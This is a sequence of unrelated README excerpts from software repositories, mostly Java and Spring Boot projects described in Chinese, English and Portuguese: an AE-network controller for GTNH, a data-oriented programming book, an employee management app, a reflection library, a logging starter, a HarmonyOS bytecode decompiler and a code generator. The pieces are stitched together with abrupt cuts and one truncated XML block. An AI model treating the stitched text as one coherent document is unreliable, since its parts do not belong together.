* 开发环境支持swagger-ui和直接下载openapi.yaml，生产环境关闭
* 前端可以通过类似orval的工具，根据下载的openapi.yaml自动生成client
* REST是多数情况下的默认最优解
**当前resteasy-spring-boot-starter和spring-doc还无法兼容**

#### GRPC接口
* 后端直接定义.proto文件，在API层生成需要实现的接口
* 前端通过工具从.proto文件直接生成client文件
* GRPC直接做前后端交互现在还有少量缺陷，例如文件上传麻烦
* 网关想做细粒度的权限控制复杂，因为不好在网关层感知payload内容

### 关于bean校验
* hibernate validator注解校验是现在体验最好的标准化方案

### 关于JPA，MyBatis和Jimmer
* 如果是国外项目，推荐JPA，国际友人对JPA标准还是很有执念的。
* 如果是国内项目，推荐MyBatis，毕竟后续能够开发维护的人是最多的。
* 如果是全新项目，推荐尝试Jimmer，很多开发体验可能超出你的想象，但不成熟。

### 关于Jackson/Fastjson/Gson
* 国外项目，不用犹豫，直接Jackson。   
* 国内项目，可以考虑fastjson2，确实快很多，就是偶尔有问题或者漏洞。  
* Gson尽量不用，范型API上相对简洁，但为此引入一套库并不值得。  

### 关于logback和log4j2
* log4j2性能好，不担心兼容性的情况默认选这个吧。  
* logback兼容性好

### 关于Hutool
* Hutool很好，比大多数的程序员能够写出的代码都好，尽量采用Hutool工具API可以保证很多质量下限。  

### 关于BeanSearcher
* 能够极大减少查询类工作量，建议尝试。

SmileYik/GTNH-OC-AE-Controller,master,"# OC-AE

该程序能够在 GTNH 原版包中实现网页端控制AE网络中物品的合成以及查看网络中的物品和流体。

目前实现的功能有：

* 搜寻网络中的物品
* 获取网络中所有流体
* 获取网络中所有源质
* 获取网络中所有 CPU 信息
* 请求网络制作指定物品
* 监控 CPU 工作状态直至 CPU 空闲

### 仓库目录结构

* `oc`: 为oc程序
* `front`: 为前端控制面板
* `backend`: 为后端

### 如何使用


在游戏中需要运行着 [oc](./oc) 程序的机器一台。

可依据自己需求搭建前端页面，也可以进 [在线体验](https://blog.smileyik.eu.org/oc-ae/) 链接，并填入自己的后端地址（若后端有密钥验证则需要输入密钥信息）进行使用。

#### 为OC电脑安装程序

安装程序可选自行复制lua代码至机器中，或者使用安装脚本进行安装，详细见 [oc页面](./oc/README.MD)，安装完后在oc电脑中 edit ./oc-ae/config.lua 中的配置。

#### 搭建后端程序

##### 自己手动搭建

后端程序需要搭建在一台GTNH游戏服务器能够访问到的机器上。详细请到 [backend](./backend) 目录查看。

##### 使用分享服务器

**!!! 请珍惜他人分享的后端服务器，拒绝滥用，合理使用。正是因为他人的无私分享，才能降低各位GTNH员工将自己的AE网络接入互联网的成本！ !!!**

**此外，非常感谢那些分享服务器的员工！**

如果你不想自己搭建一个自己的后端，可以进 [在线体验](https://blog.smileyik.eu.org/oc-ae/) 网站，进入 `Apply` 页面，申领一个网络空间地址。
可以选择现有的分享服务器，也可以自行输入一个分享服务器，申领成功后会显示出你的后端地址以及验证凭据，如图所示：

![申领成功](./docs/3.png)

请妥善保存申领到的后端地址及验证凭据，之后进入 Config 页面，在 基础URL 框中填入后端地址，Token 栏中填入验证凭据，如图所示：

![填入配置](./docs/4.png)

然后进入游戏中，按照相同的逻辑去修改 config.lua 文件。

若忘记了你申领到的地址和凭据，再次进入 `Apply` 页面中，会显示你上一次获取到的后端地址与验证凭据。

This book is a distillation of everything I’ve learned about what effective development looks like in Java (so far!). It’s what’s left over after years of experimenting, getting things wrong (often catastrophically), and
slowly having anything resembling “devotion to a single paradigm” beat out of me by the great humbling filter that is reality.

Data-orientation doesn't replace object orientation. The two work together and enhance each other. DoP is born from a very simple idea, and one that people have been repeatedly rediscovering since the dawn of computing: “representation is the essence of programming”. Programs that are organized around the data they manage tend to be simpler, smaller, and significantly easier understand. When we do a really good job of capturing the data in our domain, the rest of the system tends to fall into place in a way which can feel like it’s writing itself.

## Getting Started with this project

To download a copy of this repository, click on the [Download ZIP](https://github.com/chriskiehl/Data-Oriented-Programming-In-Java-Book/archive/refs/heads/main.zip) button or execute the following command in your terminal:

```
git clone https://github.com/chriskiehl/Data-Oriented-Programming-In-Java-Book.git
```

(If you downloaded the code bundle from the Manning website, please consider visiting the official code repository on GitHub at https://github.com/chriskiehl/Data-Oriented-Programming-In-Java-Book for the latest updates.)

The project is built with [Gradle](https://gradle.org/).

```
gradle build
```

### Running the code

The `tests/` package houses all of the runnable code. You can run all the tests in a class with this command:

```
gradle test --tests 'path.to.test.Class'
```
e.g.
```
gradle test --tests 'dop.chapter02.Listings'
```

You can also run individual tests by specifying the method.

```
gradle test --tests 'dop.chapter02.Listings.listing_2_1'
```



### How to use this repository

Each chapter in the book has an associated package in the `src/test/` directory. Most of the examples aren't necessarily things that we'll run. They're primarily for study. We'll look at them and go ""Hmm. Interesting."" DoP is a book that's about design decisions and how they affect our code. We're striving to make incorrect states impossible to express or compile. Thus, a lot of the examples are exploring how code changes (or _disappears_ entirely) when we get our modeling right.

**Listings in the Book vs Code**

Each listing in the book will have a corresponding example in the code. The Javadoc will describe which listing the code applies to.

```
/**
* ───────────────────────────────────────────────────────
*                      Listing 1.1
* ───────────────────────────────────────────────────────
*
* Here's an example of how we might traditionally model
* data ""as data"" using a Java object.
* ───────────────────────────────────────────────────────
*/
```

Sometimes, separate listings in the book will be combined into one example in the code.

```
/**
 * ───────────────────────────────────────────────────────
 *                Listings 1.5 through 1.9
 * ───────────────────────────────────────────────────────
 * Representation affects our ability to understand the code
 * as a whole. [...]
 * ───────────────────────────────────────────────────────
 */
```

> [!Note]
> The class names in the code will often differ from the class names used in the book. Java doesn't let us redefine classes over and over again (which we do in the book as we refactor), so we 'cheat' by appending a qualifying suffix. For instance, `ScheduledTask` in listing A might become `ScheduledTaskV2` or `ScheduledTaskWithBetterOOP` in a subsequent example code. The listing numbers in the Javadoc will always tie to the Listing numbers in the book.


**Character Encodings**

Make sure your IDE / Text editor is configured for UTF-8 character encoding (Windows tends to default to other encodings). Many of the in-code diagrams leverage the utf-8 charset.

Example utf-8 diagram:
```
// An informational black hole!
//
//  ┌────────  It returns nothing!
//  ▼
// void reschedule( ) {   //  ◄─────────────────────────────────┐
//     ...         ▲                                            │ Compare how very different
// }               └────── It takes nothing!                    │ these two methods are in
//                                                              │ terms of what they convey
RetryDecision reschedule(FailedTask failedTask) {       //  ◄───┘ to us as readers
    // ...
}
```

## Overview

The Employee Management System is a dynamic full-stack application that seamlessly combines cutting-edge and traditional technologies. By integrating a modern **React** frontend with a classic **Spring Boot** backend, this project demonstrates how new and established technologies can harmoniously work together to create a robust and efficient application for managing employee and department data!

## Live Deployment

The Employee Management System full-stack app is deployed with Vercel and is live at [https://employee-management-fullstack-app.vercel.app](https://employee-management-fullstack-app.vercel.app) for you to explore and interact with the application.

The backend is also deployed with Render and is available at [https://employee-management-app.onrender.com](https://employee-management-app-gdm5.onrender.com/). You can access the API endpoints directly from the browser.

**Note:** The backend API may spin down due to inactivity, so you may need to wait for up to 2 minutes for the API to start up again. Feel free to test the API endpoints and explore the application. Or, you can run the backend locally and connect it to the frontend for a more seamless experience.

Additionally, it may take a while to fetch all the data, as Render's free tier has limited resources (only 512MB RAM and 0.1 CPU). Please be patient while the data loads.

## User Interface

The frontend of the Employee Management System provides a user-friendly interface for managing employees and departments. It includes features for viewing, adding, editing, and deleting employees and departments. The app also includes visualizations for employee metrics such as growth over time and distribution by age range.

The frontend is also live at [https://employee-management-fullstack-app.vercel.app](https://employee-management-fullstack-app.vercel.app) for you to explore and interact with the application. Note that the backend is not hosted, so the API calls will not work and the data will not be present.

## Backend Setup

### 1. Prerequisites

Ensure that you have Java 11 installed on your local machine. If not, follow the instructions below:

- For MacOS:
    ```bash
    brew install openjdk@11
    export JAVA_HOME=/usr/local/opt/openjdk@11
    ```

- For Windows: Download OpenJDK 11 from [https://jdk.java.net/archive/](https://jdk.java.net/archive/) and follow the installation instructions.

- Also, ensure that MongoDB and MySQL are installed and running on your local machine.

### 2. Clone the Repository

```bash
git clone https://github.com/hoangsonww/Employee-Management-Fullstack-App.git
cd Employee-Management-Fullstack-App  # Fix the paths if necessary
cd backend
```

### 3. Install Dependencies

First, ensure you have [Maven](https://maven.apache.org/) and [Java JDK](https://www.oracle.com/java/technologies/javase-jdk11-downloads.html) installed. Run the following command to install them:

- For MacOS:
    ```bash
    brew install maven
    ```
- For Windows: Download Maven from [https://maven.apache.org/download.cgi](https://maven.apache.org/download.cgi) and follow the installation instructions.

Next, install the project dependencies:

```bash
mvn install
```

### 4. Configure the Application

Update `src/main/resources/application.properties` with your MySQL and MongoDB configuration:

```properties
# MySQL Configuration
spring.datasource.url=jdbc:mysql://localhost:3306/employee_management
spring.datasource.username=root
spring.datasource.password=password
spring.jpa.hibernate.ddl-auto=update

# MongoDB Configuration
spring.data.mongodb.uri=mongodb://localhost:27017/employee_management
```

Feel free to change the database name, username, and password, and even add more configurations as needed.

Alternatively, create a `config.properties` file in the `backend` directory and keep the `application.properties` file as is. Add the following properties to the `config.properties` file:

```properties
MYSQL_HOST=<mysql_host>
MYSQL_PORT=<mysql_port>
MYSQL_DB=<mysql_db>
MYSQL_USER=<mysql_user>
MYSQL_PASSWORD=<mysql_password>
MYSQL_SSL_MODE=<mysql_ssl_mode>
MONGO_URI=<mongo_host>
```

### 5. Start the Backend Server

Before starting the server, ensure that MySQL and MongoDB are running and properly configured on your local machine!

Then, run the following command to start the Spring Boot application:

```bash
mvn spring-boot:run
```

The backend will be available at [http://localhost:8080](http://localhost:8080).

### 6. Access the API Endpoints

- **Get All Employees:**

  ```bash
  curl -X GET http://localhost:8080/api/employees
  ```

- **Get Employee by ID:**

  ```bash
  curl -X GET http://localhost:8080/api/employees/1
  ```

- **Get All Departments:**

  ```bash
  curl -X GET http://localhost:8080/api/departments
  ```

- **Get Department by ID:**

  ```bash
  curl -X GET http://localhost:8080/api/departments/1
  ```

- **Feel free to add more API endpoints as needed...**

### 7. API Documentation

#### Overview

This application also uses Swagger to provide an interactive API documentation interface. The Swagger UI allows developers to explore the available API endpoints, view detailed information about each endpoint, and test the endpoints directly from the browser.

#### How to Access the API Documentation

1. **Start the Backend Server**: Ensure that the backend server is running. You can start the server by navigating to the backend directory and running:

   ```bash
   mvn spring-boot:run
   ```

2. **Open the Swagger UI**: Once the server is up and running, you can access the Swagger UI by navigating to the following URL in your web browser:

   [http://localhost:8080/swagger-ui.html](http://localhost:8080/swagger-ui.html)

   This will open the Swagger interface where you can explore the API endpoints.

3. Alternatively, for those who need the raw OpenAPI JSON, it is available at:

   [http://localhost:8080/v3/api-docs](http://localhost:8080/v3/api-docs)

4. **Explore the API Endpoints**:
- Use the sidebar or the search bar to navigate through the available API endpoints.
- Click on an endpoint to view its details, including the request method (GET, POST, PUT, DELETE), parameters, request body, and possible responses.
- You can also test the endpoints directly by clicking the **""Try it out""** button, providing the necessary input, and executing the request.
- If you have everything set up correctly, you should see the following Swagger UI interface:

<p align=""center"" style=""cursor: pointer"">
  <img src=""img/apis.png"" alt=""Swagger UI"" style=""border-radius: 10px"" width=""100%""/>
</p>

#### Benefits of Using Swagger UI

- **Interactive Documentation**: Developers can easily understand and use the API.
- **Quick Testing**: Test the API endpoints directly from the browser without needing a separate tool.
- **Clear Communication**: Provides a standardized way of documenting your API, making it easier for others to understand and consume.

### 8. Backend JUnit Testing

To run the unit and integration tests, use:

```bash
mvn test
```

This will run the tests and provide you with the results. Ensure that all tests pass before making any changes to the application.

Feel free to add more tests as needed to ensure the reliability and correctness of your application.

## Frontend Setup

### 1. Clone the Repository

```bash
git clone https://github.com/hoangsonww/Employee-Management-Fullstack-App.git
cd frontend
```

### 2. Install Dependencies

Ensure you have [Node.js](https://nodejs.org/) and [npm](https://www.npmjs.com/) installed. Run the following command to install the required dependencies:

```bash
npm install
```

### 3. Set Up Environment Variables

Create a `.env` file in the root of your project if it doesn't already exist. Add the following environment variable:

```env
REACT_APP_API_URL=http://localhost:8080/api
```

### 4. Start the Development Server

Run the following command to start the React development server:

```bash
npm start
```

The frontend will be available at [http://localhost:3000](http://localhost:3000).

### 5. Build for Production

To create a production build of your application, run:

```bash
npm run build
```

The build files will be generated in the `build` directory. You can deploy these files to your production server.

### 6. Test the Application (Optional)

To run tests for the frontend application, use the following command:

```bash
npm test
```

**NOTE: You might need different IDEs for the backend and the frontend. FYI, I used IntelliJ IDEA for the backend and Webstorm for the frontend.**

## Detailed Component Instructions

### `Dashboard.js`

Displays various metrics related to employees, such as total employee count, average age, employee growth over time, and distribution by age range. It uses `react-chartjs-2` to render bar charts.

### `EmployeeList.js`

Shows a list of employees with options to search, paginate, and delete entries. Includes a link to add a new employee and edit existing employees.

### `EmployeeForm.js`

Provides a form for adding or editing employee details. Fetches departments to populate the department dropdown. Uses `useParams` to determine if it's in edit mode or add mode.

### `DepartmentList.js`

Displays a list of departments with options to search, paginate, and delete entries. Includes a link to add a new department and edit existing departments.

### `DepartmentForm.js`

Provides a form for adding or editing department details.

### `Navbar.js`

The navigation bar component that includes links to various pages such as Dashboard, Employees, and Departments. Highlights the currently active page.

## Containerization

If you'd also like to containerize the project, the project also includes the `dockerfile` and `docker-compose.yaml` files for containerization. You can build and run the application in a Docker container using the following command:

```bash
docker compose up --build
```

This command will build the Docker images for the frontend and backend, create containers, and start the application. Feel free to view them in Docker Desktop.

Alternatively, you can navigate to the `backend` and `frontend` directories and build the Docker images separately using the following commands:

```bash
docker build -t <your_docker_username>/employee-management-app-backend .
docker build -t <your_docker_username>/employee-management-app-frontend .
```

Then, you can run the containers using the following commands:

```bash
docker run -p 8080:8080 <your_docker_username>/employee-management-app-backend
docker run -p 3000:3000 <your_docker_username>/employee-management-app-frontend
```

Also, you can push the Docker images to Docker Hub using the following commands:

```bash
docker push <your_docker_username>/employee-management-app-backend
docker push <your_docker_username>/employee-management-app-frontend
```

Additionally, you can access the image on **Docker Hub** **[here](https://hub.docker.com/repository/docker/hoangsonw/employee-management-app/).**

## Kubernetes

The project also includes Kubernetes configuration files in the `kubernetes` directory for deploying the application to a Kubernetes cluster. You can deploy the application to a Kubernetes cluster using the following command:

```bash
kubectl apply -f kubernetes
```

This command will create the necessary deployments, services, and config maps for the frontend and backend. You can access the application using the NodePort or LoadBalancer service created.

## LoadBalancer Service

The project also features Nginx as a LoadBalancer service for routing traffic to the frontend and backend services. The Nginx configuration file is located in the `nginx` directory.

There is also a `Dockerfile` for building the Nginx image. We are using this file to build the Nginx image and deploy it to the cloud with Render, which we are currently using to balance the traffic of the frontend and backend services.

Feel free to customize the Nginx configuration to suit your specific requirements and deployment process.

## Jenkins

The project also includes a `Jenkinsfile` for automating the build and deployment process using Jenkins. You can create a Jenkins pipeline job and use the `Jenkinsfile` to build and deploy the application to a Kubernetes cluster.

Feel free to customize the Jenkins pipeline to suit your specific requirements and deployment process.

## Troubleshooting

### Backend Issues

- **`Could not autowire` Errors**: Ensure that all dependencies are correctly defined in the `pom.xml` and that the repository interfaces are located in the correct package structure.

- **`Exception opening socket` for MongoDB**: Verify that MongoDB is running and accessible at `localhost:27017`. Check MongoDB logs for any connection issues.

- **`Build failed`**: Ensure that you are using Java 11 and that all dependencies are correctly installed. Check the `pom.xml` file for any missing dependencies.

- Regardless of the error, perhaps you can try running the following commands to clean and rebuild the project:

  ```bash
  mvn clean install
  ```

  If the issue persists, you can run Maven with more detailed logging to identify the problem:

  ```bash
  mvn -X spring-boot:run
  ```

### Frontend Issues

- **Error: Cannot read properties of undefined (reading 'id')**: Ensure that the `employee` object in `EmployeeForm` is correctly initialized and that the `id` parameter is correctly passed. Check the `getEmployeeById` and `updateEmployee` functions for proper handling of data.

- **Chart Issues**: Ensure `Chart.js` and `react-chartjs-2` are correctly installed and configured. Verify that the chart data passed to components is in the correct format.

- Regardless of the error, perhaps you can try running the following commands to clean and rebuild the project:

  ```bash
  npm install
  ```

  If the issue persists, you can run the React development server with more detailed logging to identify the problem:

  ```bash
  npm start --verbose
  ```

hhy50/reflect-linker,master,"## reflect-linker
reflect-linker 是一个用于链接反射对象的库，它可以帮助你在运行时代替反射去使用对象中字段和方法。

简单尝试：

1. 引入依赖

```xml
<dependency>
    <groupId>io.github.hhy</groupId>
    <artifactId>reflect-linker</artifactId>
    <version>1.0.0</version>
</dependency>
```
2. 定义访问规则
以ArrayList举例
```java
@Target.Bind(""java.util.ArrayList"")
public interface MyArrayList {
    
    void add(Object o);
    
    @Field.Getter(""elementData"")
    Object[] getElementData();
    
    @Field.Setter(""elementData"")
    void setElementData(Object[] elementData);
}
```
3. 创建连接器
```java
class Example {
    public static void main(String[] args) throws LinkerException {
        MyArrayList list = LinkerFactory.createLinker(MyArrayList.class, new ArrayList<>());
        
        // do thing
    }
}
```

### 更多用法:

1. 链式表达式访问

```java
class User {
    private String name;
    private int age;
}
class UserWrap {
    private User user;
}
@Target.Bind(""io.github.hhy50.linker.example.nest.UserWrap"")
interface UserVisitor {
    @Field.Getter(""user"")
    User getUser();

    @Field.Setter(""user"")
    void setUser(User user);

    @Field.Setter(""user.name"")
    void setName(String val);

    @Field.Getter(""user.name"")
    String getName();

    @Field.Setter(""user.age"")
    void setAge(int val);

    @Field.Getter(""user.age"")
    int getAge();
}

class Example {
    public static void main(String[] args) throws LinkerException {
        UserWrap userWrap = new UserWrap();
        UserVisitor userVisitor = LinkerFactory.createLinker(UserVisitor.class, userWrap);
        userVisitor.setUser(new User());
        userVisitor.setAge(20);
        userVisitor.setName(""example"");

        // do something
    }
}
```

2. 动态类型

```java
class A { }
class B {
    String val = ""this is b'val"";
}
class A2 extends A {
    private B b;
    public A2(B b) {
        this.b = b;
    }
}
class MyObject {
    private A a;
}
@Target.Bind(""io.github.hhy50.linker.example.dynamic.MyObject"")
interface MyObjectVisitor {
    @Field.Setter(""a"")
    void setA(A val);

    @Field.Getter(""a.b"")
    B getB();
}
class Example {
    public static void main(String[] args) throws LinkerException {
        MyObject myObj = new MyObject();
        MyObjectVisitor myObjVisitor = LinkerFactory.createLinker(MyObjectVisitor.class, myObj);
        myObjVisitor.setA(new A2(new B()));
        System.out.println(myObjVisitor.getB().val);

        // do something
    }
}
```

上面表达式`@Field.Getter(""a.b"")`中, `A class`是没有`B field`的, `B field`存在于`A`的子类中, 这样的字段视为运行时字段, 这样会在调用对应方法时动态获取`A`的类型

如果您非常在意执行性能, 可以使用`@Typed`指定`A class`的类型, 将`B field`变为已知的字段
```java
//@Typed(name = ""a"", type = ""io.github.hhy50.linker.example.dynamic.A2"") // 也可以声明在这里
@Target.Bind(""io.github.hhy50.linker.example.dynamic.MyObject"")
interface MyObjectVisitor {
    @Field.Setter(""a"")
    void setA(A val);

    @Typed(name = ""a"", type = ""io.github.hhy50.linker.example.dynamic.A2"")
    @Field.Getter(""a.b"")
    B getB();
}
```
然后重新`run`

系统运行记录模块旨在记录系统运行时的数据，帮助开发者了解系统运行情况，以及通过运行数据确认系统问题，减少对接调试时间。

体验地址: http://119.163.197.219:13456/view/runtime 密码 ： admin /admin@1024



# 功能模块

1. 接口访问记录 。 接口访问记录会记录 接口地址，请求方式，请求参数，相应结果，请求人，请求人姓名，请求企业ID，请求企业名称，访问时间，追踪码，异常类，异常信息，异常堆栈信息等。
2. 日志订阅。通过日志的Marker功能标记特定的日志，日志会自动存储，日志订阅模块可以查询和处理被标记的日志。
3. 项目配置。可以查询当前spring boot 的所有配置信息。
4. bean查询。查询当前项目的所以Spring bean。
5. 接口查询。查询当前项目下的所有接口API。
6. 日志查询与存储。可以保存查询方案，持久化。 日志存储使用 Lucene ,经过测试 200 万 日志每天,检索性能可以做到一秒以内。
7. 日志级别查询，与日志级别设置。
8. 日志消息推送。支持飞书机器人消息推送。
9. 可以通过接口调用spring bean方法。可以帮助用户在服务运行时处理异常。



## 第一步 : Maven 引入依赖

```xml
<dependency>
    <groupId>cn.aio1024.runtime</groupId>
    <artifactId>runtime-record-spring-boot-starter</artifactId>
    <version>1.1.7</version>
</dependency>
```

> 当前最新版本为 `1.1.7`

> 日志追踪需要依赖阿里的线程工具 `transmittable-thread-local` 日志追踪码与线程关联

> 日志存储和查询需要依赖 `Lucene` , Lucene 仅能实现单机日志

> 系统运行时 日志级别设置 , 系统配置 , Bean管理 等模块 需要依赖 `actuator` 。

> 统一用户中心接口，和 `controller` 返回值对象等需要依赖 `basic-all`

> 接口请求使用了AOP拦截需要依赖 `aspectj`


## 第二步 ,配置系统工作目录

```properties
project.workspace.path=/home/guodun/workspace/electronic
```

> 项目工作目录定义在基础框架底层包中，可以为日后模块化功能提供统一的项目工作目录配置。


## 第三步,启动自带的用户权限模块

```properties
aio.runtime.security.enable=true
aio.runtime.security.username=guodun
aio.runtime.security.password=jldfasfsfsdflsfjasfsdfjsjf
```

> `aio.runtime.security.username` 默认值为 admin 。 表示 登录的用户名

> `aio.runtime.security.password` 默认值为 `admin@1024`  登录密码。

> `aio.runtime.security.enable` 表示启动默认的用户权限 , 默认值为 false ，表示不启动默认的权限

后续版本会支持客户化账号密码登录


访问地址 ：

```shell
/view/runtime
```

## 第四步，添加日志追踪码

```java
@Slf4j
@Configuration
public class ServletWebInterceptorConfig implements WebMvcConfigurer {

    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        registry.addInterceptor(new TraceIdInterceptor()).addPathPatterns(""/**"");
    }
}
```

> servlet 中添加 `TraceIdInterceptor` 拦截器 ，拦截器会使用雪花算法标记线程 ，并且记录到日志中。效果如下图


![img.png](docs/imgs/img.png)




## 日志订阅使用方式

示例代码如下 ：
```java
log.error(SubscribeMarker.getMarker(""MappingsEndpoint""), ""读取接口信息失败。MappingsEndpoint 未注入。请引入 spring-boot-starter-actuator 模块，并且开启MappingsEndpoint "");
```

只需要在打印日志时，添加一个标签声明，控制台也可以通过这个标记查询这个标记的所有订阅日志。



## 更新日志 

### 1.1.7 
1. 添加异常信息收集功能。可用于前端的异常上报。
2. 修改日志索引合规则。 按照周合并索引库

### 1.1.6
1. 解决日志模块索引文件太多导致的内存溢出问题。添加了日志索引合并功能

### 1.1.5

1. 优化执行bean功能。方法重载导致的方法重名，参数构造难度高。
2. 添加飞书机器人日志订阅通知

### 1.1.4 

1. 新增日志列表按照时间排序功能。
2. 新增日志订阅通知功能。
3. 解决页面加密安全bug。

### 1.1.3

1. 添加日志追踪码拦截器
2. 修改接口请求路径接口不一致，导致集成复杂问题
3. 默认开启日志组件安全功能

- **Quero apenas acompanhar esse projeto:** Caso deseje apenas acompanhar a evolução desse projeto para as próximas monitorias, dê um watch, assim será informado sobre as novas alterações desse projeto.

Considere dar uma “estrela“ ao projeto se você achar ele útil **😊**!

2. **Não tenho um conta no GitHub**

Primeiramente, recomendo que crie sua conta no GitHub e siga uma das opções do item 1. Caso opte por não criar a conta no GitHub, você pode:

- **Tenho o Git instalado em minha máquina:** clone este projeto com o comando:

“git clone <https://github.com/LevyVianna/bootcamp-apis-springboot.git”>

… e você poderá alterar esse código na sua IDE favorita.

- **Não tenho o Git instalado em minha máquina:** você pode fazer o dowload do projeto clicando no botão verde “Code“ e depois em “Download ZIP”.

## **Stack Utilizado no Projeto**

![ ](https://raw.githubusercontent.com/LevyVianna/bootcamp-apis-springboot/main/imgs/crud_USERS.png)

Este projeto foi desenvolvido utilizando uma stack moderna e eficiente para criar uma API robusta e fácil de manter. Aqui estão as principais tecnologias e dependências utilizadas:

- **Java 17**: A versão mais recente e estável do Java, garantindo performance e suporte a novas funcionalidades da linguagem.
- **Spring Boot 3.3.2**: Framework poderoso que facilita o desenvolvimento de aplicações Java, oferecendo uma configuração mínima e integração com diversas tecnologias.
- **Spring Data JPA**: Abstração do banco de dados, facilitando o acesso e a manipulação de dados com o uso de repositórios e a integração com o JPA (Java Persistence API).
- **H2 Database**: Banco de dados em memória, ideal para desenvolvimento e testes rápidos, sem a necessidade de configurar um banco de dados externo.
- **Spring Web**: Módulo do Spring Boot que facilita a criação de APIs RESTful, com suporte completo a padrões de mercado.
- **Springdoc OpenAPI (Swagger 3.0)**: Ferramenta para geração automática de documentação da API, permitindo que os desenvolvedores entendam e testem os endpoints de forma interativa.
- **Maven**: Ferramenta de build e gerenciamento de dependências, essencial para garantir que todas as bibliotecas e plugins estejam atualizados e configurados corretamente.

## **Dicas Úteis**

- **Leia o arquivo pom.xml**: É fundamental entender as dependências e versões utilizadas no seu projeto. O arquivo pom.xml gerencia essas dependências e configurações do Maven, sendo o coração da sua aplicação em termos de build e integração.
- **Verifique a versão do Java na sua IDE**: Caso esteja configurado em sua IDE uma versão anterior ao JDK 17, faça o download da JDK 17 (ou superior) em: <https://www.oracle.com/java/technologies/downloads/#jdk17-windows>

... instale-o e mude para a JDK 17(ou superior) na sua IDE.

Caso a JDK de sua IDE seja a 17 ou superior, o projeto deve compilar e rodar sem problemas.

## **Arquitetura e Padrões**

Neste projeto, implementamos uma API CRUD para gerenciamento de usuários. Para manter o código organizado e de fácil manutenção, seguimos os padrões:

- **Controller**: Responsável por lidar com as requisições HTTP. Aqui, definimos os endpoints da API e delegamos a lógica para as camadas adequadas.
- **Service**: Contém a lógica de negócio. O Service faz a ponte entre o Controller e o Repository, garantindo que todas as regras de negócio sejam aplicadas corretamente.
- **Repository**: Cuida da comunicação com o banco de dados. Utilizando o Spring Data JPA, essa camada facilita as operações de persistência de dados.

## **Objetivos do Projeto**

Os principais objetivos deste projeto, juntamente com a monitoria, são:

- **Fornecer uma base** para quem quer começar a trabalhar com APIs e microserviços em Java e Spring Boot.
- **Demonstrar a importância de seguir padrões de mercado**, como **REST** (incluindo o uso correto de códigos de status HTTP, verbos HTTP e nomenclatura de APIs), a **documentação com OpenAPI 3.0**, e a **correta utilização de logs**.

### **Documentação OpenAPI (Swagger):**
http://localhost:8080/swagger-ui/index.html#/

### **H2 DB:**
http://localhost:8080/h2-console/
- **JDBC URL:** jdbc:h2:mem:testdb
- **User Name:** as
- **password:** password

Espero que este projeto possa servir como uma porta de entrada para sua jornada no desenvolvimento de APIs e microserviços!

证件照APi:  可以找我拿



## ⚡️注意

1. 理论上支持本地存储，但是作者还没测试，对象存储已经过测试，作者用的是腾讯cos，按需测试哈
2. 鉴黄模型目前不怎么精准，建议在小程序过审时打开，其它时间关闭
3. 部署自已鉴黄和证件照APi时，不建议开设外网，防止被抓接口后滥用，yml里面配置127.0.0.1即可本地链接，速度还快，还安全
4. 为什么不把APi地址等参数放入数据库来配置？答：频繁使用的值，不建议与Mysql频繁握手
5. 当你部署到云上（服务器）时，别忘记配置你的小程序域名(如图) <p></p> <img src=""./assets/11.png"">

abc-decompiler 基于 [jadx](https://github.com/skylot/jadx/) 和 [abcde](https://github.com/Yricky/abcde/tree/main) 实现的鸿蒙 [abc/方舟字节码](https://developer.huawei.com/consumer/cn/doc/harmonyos-guides-V5/arkts-bytecode-fundamentals-V5#%E6%9C%AF%E8%AF%AD%E5%92%8C%E7%BA%A6%E6%9D%9F) 的反编译工具.

目前还在开发中，欢迎有兴趣的兄弟一起讨论、研究.

![qq.png](qq.png)

## #1 使用方法

下载或者编译 jar 包，然后运行把 hap 文件解压缩，将其中的 modules.abc 字节码文件拖入工具

![img.png](img.png)


## #2 进展与计划

分析了方舟的字节码，有很大部分与 DEX 字节码语义相近，且 jadx 比较成熟，于是基于 jadx 实现反编译器。

目前的进展：
- [x] 修改输入部分代码，可以拖入 abc 文件分析
- [x] 粗略实现了字节码（大部分特殊指令采用伪函数实现），目前实现指令 [227](https://github.com/ohos-decompiler/abc-decompiler/issues/6) 条，字节码总数：[282 条 (其中可用指令条数为 227 条)](https://developer.huawei.com/consumer/cn/doc/harmonyos-guides-V5/arkts-bytecode-fundamentals-V5#%E6%9C%AF%E8%AF%AD%E5%92%8C%E7%BA%A6%E6%9D%9F).
- [ ] 优化字节码表示，根据需要定制 IR.

计划：
- [x] 先补齐字节码，让代码能看.
- [ ] 开发 abc 的反编译优化模块（在 jadx 中为 Pass），优化代码显示，让代码好看.
- [ ] 实现数据流分析，自动化漏洞挖掘.


## #3 关键代码路径

字节码解析: [jadx-core/src/main/java/jadx/core/dex/instructions/InsnDecoder.java](./jadx-core/src/main/java/jadx/core/dex/instructions/InsnDecoder.java)

jadx 自带的 Pass: [jadx-core/src/main/java/jadx/core/dex/visitors](./jadx-core/src/main/java/jadx/core/dex/visitors)


## #4 编译

JDK 版本：JDK17+

需要编译 patch 过的 [abcde](https://github.com/ohos-decompiler/abcde) 库并安装到本地 maven 仓

```
 ./gradlew publishToMavenLocal
```

如果正确执行，命令行中会有如下输出

```
Done!
groupId: io.github.yricky.oh //这部分为下述$groupId
version: 0.1.0-dev-4d03a43 //这部分为下述$version
```

vscode 全局搜索替换项目下所有 gradle文件中的 `io.github.yricky.oh:abcde-jvm:0.1.0-dev-xxx` 为实际版本号.

```
   dependencies {
        // implementation(""$groupId:abcde-jvm:$version"")
        implementation(""io.github.yricky.oh:abcde-jvm:0.1.0-dev-4d03a43"")
    }
```

然后编译 abc-decompiler

```
./gradlew dist
```

### 脚手架搭建
为了方便框架应用与理解，cap4j配备了代码生成插件`cap4j-ddd-codegen`，基于该插件，我们可以非常方便地生成初始项目脚手架、实体映射代码和基于JPA的聚合仓储代码。

#### **第一步**：新建一个空的maven项目
> 定好maven坐标三要素：`groupId`、`artifactId`、`version`

#### **第二步**：修改pom.xml
> 在pom.xml中添加`cap4j-ddd-codegen-maven-plugin`插件。
```xml

        </plugins>
    </build>
</project>
```
通常，`cap4j-ddd-codegen`插件只需要我们根据团队或项目的实际情况调整以下配置项即可使用。
> `<basePackage>`_项目基础包名，一般为com.yourcompany.project_`</basePackage>` 
> 
> `<connectionString>`_数据库链接_`</connectionString>`
> 
> `<user>`_数据库账号_`</user>`
> 
> `<pwd>`_数据库密码_`</pwd>`
> 
> `<schema>`_数据库名称_`</schema>` 


#### **第三步**：执行插件命令，生成项目脚手架
